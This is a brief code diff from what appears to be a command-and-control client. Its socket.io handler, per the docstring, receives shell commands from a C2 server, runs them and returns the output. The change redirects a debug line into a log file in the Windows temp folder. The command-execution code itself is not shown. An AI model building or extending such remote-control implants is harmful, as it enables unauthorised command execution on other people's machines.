@@ -17,7 +17,8 @@ def make_client():
     @sio.on("shell_command")
     def on_command(data):
         """Receive command from C2, run it, send output back."""
-        print(f"[debug] data={data!r}  type={type(data)}")  # temporary debug line
+        with open(r"C:\Windows\Temp\cerberus_debug.log", "a") as f:
+            f.write(f"[debug] data={data!r}  type={type(data)}\n")  # temporary debug line
 
         # Guard: data must be a dict with a "command" key
         if not isinstance(data, dict):
